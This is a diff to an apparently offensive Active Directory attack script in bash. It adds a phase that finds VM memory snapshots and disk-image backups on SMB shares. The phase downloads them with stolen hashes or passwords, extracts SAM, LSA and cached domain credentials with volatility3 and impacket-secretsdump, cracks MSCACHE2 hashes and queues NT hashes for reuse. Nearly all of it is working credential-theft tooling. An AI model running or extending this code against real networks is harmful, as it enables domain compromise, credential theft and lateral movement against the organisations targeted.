@@ -22,7 +22,7 @@ set -o pipefail
 # ===========================================================================
 #  METADATA
 # ===========================================================================
-readonly VERSION="1.46.0"
+readonly VERSION="1.47.0"
 readonly AUTHOR="c4sh3r"
 KERBRUTE_BIN="${KERBRUTE_BIN:-/opt/kerbrute}"
 
@@ -210,6 +210,7 @@ BADSUCCESSOR_FAC_USER=""          # an owned identity that can MINT dMSAs (BadSu
 BADSUCCESSOR_FAC_OU=""            # OU DN that identity can create dMSA children in
 BADSUCCESSOR_FAC_CC=""            # that identity's Kerberos ccache (needed for the S4U2self pull)
 declare -A SHARE_DROP_DONE=()     # "user:share" → writable-share payload drop already handled
+declare -A MEM_DUMP_DONE=()       # "share/path" → memory/disk-image backup already hashdumped
 declare -A DELETED_SID=()         # objectSid (lc) → "dn<TAB>sam" of an AD-Recycle-Bin object
 KERB_DONE=0                       # Kerberoast request runs once (SPN set is domain-wide)
 # Groups that mean "this account is effectively privileged" → crown it in the summary
@@ -287,6 +288,34 @@ nxc_cred_args() {
         [[ "$KERBEROS" == "1" && -n "$DC_FQDN" && ( -n "$PASS" || -n "$HASH" ) ]] && a+=(-k)
     fi
     printf '%s\n' "${a[@]}"
+}
+
+# Authentication arguments for smbclient (mirrors nxc_cred_args). Used when we must
+# pull a specific file (e.g. a multi-GB memory dump) that the size-capped spider skips.
+smb_cred_args() {
+    local a=()
+    if [[ "$KERBEROS" == "1" && -n "$KERB_TICKET" ]]; then
+        a+=(-k)                                 # honours KRB5CCNAME (already exported)
+    elif [[ -n "$USER" ]]; then
+        if [[ -n "$HASH" ]]; then
+            # smbclient takes the NT hash AS the password when --pw-nt-hash is set.
+            # Strip any LM: prefix — only the NT half is used.
+            a+=(-U "${USER}%${HASH##*:}" --pw-nt-hash)
+        else
+            a+=(-U "${USER}%${PASS}")
+        fi
+        [[ -n "$DOMAIN" ]] && a+=(-W "$DOMAIN")
+    else
+        a+=(-N)                                 # null session
+    fi
+    printf '%s\n' "${a[@]}"
+}
+
+# Resolve the volatility3 launcher (pipx exposes `vol`; some distros ship `vol3`/`vol.py`).
+_vol_bin() {
+    local b
+    for b in vol vol3 volatility3 vol.py; do have "$b" && { printf '%s\n' "$b"; return 0; }; done
+    return 1
 }
 
 confirm() {
@@ -4612,6 +4641,176 @@ phase_ntds_local() {
     fi
 }
 
+# ===========================================================================
+#  MEMORY / DISK-IMAGE BACKUP HARVEST
+#  Admins (and backup software) routinely leave VM memory snapshots and disk
+#  images on file shares — *.vmem/*.dmp/MEMORY.DMP/hiberfil.sys/*.raw (memory)
+#  and *.vhd(x)/*.vmdk/*.vdi (disk). These carry LSASS secrets / SAM+SYSTEM
+#  hives → free credentials, no LSASS touch on the live host. The size-capped
+#  share spider deliberately skips these multi-GB files, so we enumerate the
+#  inventory separately and pull only the matching artifacts on demand.
+#
+#  Fully generic: keys off file extension, not any machine-specific name.
+#  Memory images  → volatility3 windows.hashdump / lsadump / cachedump.
+#  Disk images    → mount read-only (guestmount) → secretsdump SAM/SYSTEM LOCAL.
+# ===========================================================================
+_MEMIMG_EXT_RE='\.(vmem|vmss|vmsn|sav|raw|mem|lime|dmp|core|crash)$|(^|/)(hiberfil\.sys|memory\.dmp)$'
+_DISKIMG_EXT_RE='\.(vhd|vhdx|vmdk|vdi|avhd|avhdx|qcow2|img)$'
+
+# Pull NT hashes out of a volatility hashdump table → queue them. $1=output $2=source label
+_vol_ingest_hashes() {
+    local out="$1" src="$2" line u nt got=0
+    while IFS= read -r line; do
+        # cols: User  RID  LMhash  NThash   (whitespace/tab separated)
+        u=$(awk '{print $1}' <<<"$line"); nt=$(grep -oiE '[a-f0-9]{32}' <<<"$line" | tail -1)
+        [[ -z "$u" || -z "$nt" ]] && continue
+        loot "★ ${C_BOLD}${u}${C_RESET} NT hash from ${src}: ${C_MAGENTA}${nt}${C_RESET}"
+        note_cred_source "$u" "memory/disk image hashdump (${src})"
+        queue_cred "$u" "" "$nt" "image hashdump"; got=1
+    done < <(grep -iE '^[A-Za-z0-9._$-]+[[:space:]]+[0-9]+[[:space:]]+[a-f0-9]{32}[[:space:]]+[a-f0-9]{32}' "$out" 2>/dev/null)
+    return $((got ? 0 : 1))
+}
+
+# Run volatility3 (+ optional cracking of MSCACHE) over one memory image. $1=file
+_harvest_memimage() {
+    local img="$1" vb base; base=$(basename "$img")
+    vb=$(_vol_bin) || { warn "  volatility3 not installed (pip install volatility3) — skipping $base"; return 1; }
+    subsection "volatility3 hashdump → $base"
+    local hd="$OUTDIR/vol_${base}.hashdump"
+    run "$vb -q -f '$img' windows.hashdump"
+    "$vb" -q -f "$img" windows.hashdump >"$hd" 2>>"$LOGFILE" || warn "  windows.hashdump failed (wrong profile / not a Windows memory image?)"
+    _vol_ingest_hashes "$hd" "$base" || info "  No SAM hashes recovered from $base"
+
+    # LSA secrets (machine acct, DefaultPassword, service creds) — best effort.
+    local ls="$OUTDIR/vol_${base}.lsadump"
+    "$vb" -q -f "$img" windows.lsadump >"$ls" 2>>"$LOGFILE" || true
+    [[ -s "$ls" ]] && grep -qiE 'DefaultPassword|DPAPI|_SC_|aspnet' "$ls" 2>/dev/null \
+        && loot "  LSA secrets recovered → $(basename "$ls") (review for plaintext service creds)"
+
+    # Domain cached creds (MSCACHE2 / $DCC2$) — not pass-the-hash usable, but crackable.
+    local cc="$OUTDIR/vol_${base}.cachedump"
+    "$vb" -q -f "$img" windows.cachedump >"$cc" 2>>"$LOGFILE" || true
+    if grep -qiE '\$DCC2\$|\$MSCACHE' "$cc" 2>/dev/null; then
+        grep -oiE '.*\$DCC2\$[0-9#a-f]+' "$cc" >>"$OUTDIR/mscache_hashes.txt" 2>/dev/null
+        loot "  Domain cached creds (MSCACHE2) → mscache_hashes.txt"
+        [[ "$DO_CRACK" == "1" ]] && crack_hashes "$OUTDIR/mscache_hashes.txt" 2100 "MSCACHE2"
+    fi
+    return 0
+}
+
+# Mount a disk image read-only, locate SAM/SYSTEM hives (+ NTDS.dit) → secretsdump. $1=file
+_harvest_diskimage() {
+    local img="$1" base; base=$(basename "$img")
+    have guestmount || { warn "  guestmount (libguestfs-tools) not installed — cannot mount $base; mount it manually + run secretsdump LOCAL"; return 1; }
+    have impacket-secretsdump || { warn "  impacket-secretsdump missing — skipping $base"; return 1; }
+    local mnt; mnt=$(mktemp -d "${TMPDIR:-/tmp}/adp_disk.XXXXXX")
+    subsection "Mounting disk image read-only → $base"
+    run "guestmount -a '$img' -i --ro '$mnt'"
+    if ! guestmount -a "$img" -i --ro "$mnt" 2>>"$LOGFILE"; then
+        warn "  guestmount failed (encrypted / unsupported layout?)"; rmdir "$mnt" 2>/dev/null; return 1
+    fi
+    local cfg sam sys sec dit
+    cfg=$(find "$mnt" -ipath '*/system32/config' -type d 2>/dev/null | head -1)
+    sam=$(find "$cfg" -maxdepth 1 -iname SAM    2>/dev/null | head -1)
+    sys=$(find "$cfg" -maxdepth 1 -iname SYSTEM 2>/dev/null | head -1)
+    sec=$(find "$cfg" -maxdepth 1 -iname SECURITY 2>/dev/null | head -1)
+    dit=$(find "$mnt" -iname 'ntds.dit' 2>/dev/null | head -1)
+    if [[ -n "$dit" && -n "$sys" ]]; then
+        loot "★★★ NTDS.dit + SYSTEM inside $base → offline domain dump"
+        phase_ntds_local "$dit" "$sys"
+    elif [[ -n "$sam" && -n "$sys" ]]; then
+        loot "★★ SAM + SYSTEM hives inside $base → local secretsdump"
+        local sd="$OUTDIR/disk_${base}.secrets"
+        run "impacket-secretsdump -sam '$sam' -system '$sys' ${sec:+-security '$sec'} LOCAL"
+        impacket-secretsdump -sam "$sam" -system "$sys" ${sec:+-security "$sec"} LOCAL 2>>"$LOGFILE" | tee "$sd"
+        while IFS= read -r line; do
+            local u nt; u=$(cut -d: -f1 <<<"$line"); nt=$(cut -d: -f4 <<<"$line")
+            [[ "$nt" =~ ^[a-f0-9]{32}$ ]] || continue
+            loot "★ ${C_BOLD}${u}${C_RESET} NT hash from ${base}: ${C_MAGENTA}${nt}${C_RESET}"
+            note_cred_source "$u" "disk-image SAM dump (${base})"; queue_cred "$u" "" "$nt" "disk-image SAM"
+        done < <(grep -E ':::' "$sd" 2>/dev/null)
+    else
+        info "  No SAM/SYSTEM/NTDS hives found in $base"
+    fi
+    guestunmount "$mnt" 2>>"$LOGFILE" || fusermount -u "$mnt" 2>>"$LOGFILE" || true
+    rmdir "$mnt" 2>/dev/null || true
+}
+
+# Enumerate readable shares for memory/disk-image backups and harvest creds from them.
+# $1 = nxc cred-args array name is rebuilt internally; uses globals DCT/DC_IP/OUTDIR.
+phase_mem_dump_harvest() {
+    [[ "$HAVE_AUTH" != "1" || "$CAP_SMB" != "1" ]] && return
+    [[ "$IS_DC_ADMIN" == "1" ]] && return        # DCSync already covers everything
+    local args; mapfile -t args < <(nxc_cred_args)
+    local inv="$OUTDIR/shares/_inventory"; mkdir -p "$inv"
+
+    # Listing-only spider (DOWNLOAD_FLAG=false → NO size cap matters): full inventory
+    # of every readable share, including the multi-GB images the looting spider skips.
+    $NXC smb "$DCT" "${args[@]}" -M spider_plus -o DOWNLOAD_FLAG=false OUTPUT_FOLDER="$inv" \
+        >>"$LOGFILE" 2>&1
+    local js; js=$(find "$inv" -name '*.json' -type f 2>/dev/null | head -1)
+    [[ -z "$js" || ! -s "$js" ]] && return
+
+    # Parse the JSON inventory → "share<TAB>relpath<TAB>humansize<TAB>bytes" for any
+    # entry whose path matches a memory- or disk-image extension.
+    local matches; matches=$(MEMRE="$_MEMIMG_EXT_RE" DISKRE="$_DISKIMG_EXT_RE" python3 - "$js" <<'PYEOF'
+import json, os, re, sys
+memre=re.compile(os.environ["MEMRE"], re.I); diskre=re.compile(os.environ["DISKRE"], re.I)
+def to_bytes(s):
+    if isinstance(s,(int,float)): return int(s)
+    m=re.match(r'\s*([\d.]+)\s*([KMGT]?)B?', str(s), re.I)
+    if not m: return 0
+    n=float(m.group(1)); u={'':1,'K':1024,'M':1024**2,'G':1024**3,'T':1024**4}.get(m.group(2).upper(),1)
+    return int(n*u)
+try: data=json.load(open(sys.argv[1]))
+except Exception: sys.exit(0)
+for share, files in (data.items() if isinstance(data,dict) else []):
+    if not isinstance(files,dict): continue
+    for path, meta in files.items():
+        kind = "mem" if memre.search(path) else ("disk" if diskre.search(path) else None)
+        if not kind: continue
+        sz = meta.get("size") if isinstance(meta,dict) else ""
+        print("%s\t%s\t%s\t%s\t%s" % (kind, share, path, sz, to_bytes(sz)))
+PYEOF
+)
+    [[ -z "$matches" ]] && return
+
+    section "MEMORY / DISK-IMAGE BACKUP HARVEST"
+    loot "Found $(grep -c . <<<"$matches") memory/disk-image backup(s) on readable shares"
+    local dumpdir="$OUTDIR/dumps"; mkdir -p "$dumpdir"
+    local cap_mb="${MAX_DUMP_MB:-8192}"          # skip images larger than this unless --abuse/-y
+
+    local kind share path human bytes key smbargs local_f
+    while IFS=$'\t' read -r kind share path human bytes; do
+        [[ -z "$share" || -z "$path" ]] && continue
+        key="${share}/${path}"
+        [[ -n "${MEM_DUMP_DONE[$key]:-}" ]] && continue
+        MEM_DUMP_DONE["$key"]=1
+        warn "Backup image: ${C_BOLD}//${DCT}/${share}/${path}${C_RESET} (${human:-?})"
+        # Size gate: huge pulls are slow & noisy. Auto-proceed only under -y/--abuse or
+        # below the cap; otherwise ask. abuse_confirm honours AUTO_YES/DO_ABUSE.
+        if [[ "${bytes:-0}" -gt $((cap_mb*1024*1024)) ]]; then
+            abuse_confirm "  Download ${human} image '${path##*/}'? (large; set MAX_DUMP_MB to raise the auto cap)" || { info "  Skipped (size)"; continue; }
+        fi
+        mapfile -t smbargs < <(smb_cred_args)
+        local_f="$dumpdir/$(basename "$path")"
+        local rpath="${path//\//\\}"             # smbclient wants backslash paths
+        run "smbclient //${DCT}/${share} <creds> -c 'get \"${rpath}\" \"${local_f}\"'"
+        if ! smbclient "//${DCT}/${share}" "${smbargs[@]}" \
+                -c "lcd \"$dumpdir\"; get \"$rpath\" \"$local_f\"" >>"$LOGFILE" 2>&1 \
+                || [[ ! -s "$local_f" ]]; then
+            warn "  Download failed → $path"; continue
+        fi
+        loot "  Pulled $(du -h "$local_f" 2>/dev/null | cut -f1) → ${local_f#$OUTDIR/}"
+        case "$kind" in
+            mem)  _harvest_memimage  "$local_f" ;;
+            disk) _harvest_diskimage "$local_f" ;;
+        esac
+        # Reclaim space: these are multi-GB. Keep only if user asked to.
+        [[ "${KEEP_DUMPS:-0}" == "1" ]] || { rm -f "$local_f" 2>/dev/null; detail "      (removed local copy; set KEEP_DUMPS=1 to retain)"; }
+    done <<<"$matches"
+}
+
 phase_share_loot() {
     [[ "$HAVE_AUTH" != "1" || "$CAP_SMB" != "1" ]] && return
     [[ "$IS_DC_ADMIN" == "1" ]] && { info "Skipping share spider — ${USER} is DC admin (DCSync covers everything)"; return; }
@@ -4718,6 +4917,10 @@ phase_share_loot() {
     if grep -qiE 'Protect/|Credentials|Vault|masterkey' <<<"$files"; then
         phase_dpapi_offline "$dl"
     fi
+
+    # Memory/disk-image backups left on shares → hashdump them (size-capped spider
+    # above never pulls these multi-GB files, so this enumerates + pulls them itself).
+    phase_mem_dump_harvest
 }
 
 # ===========================================================================
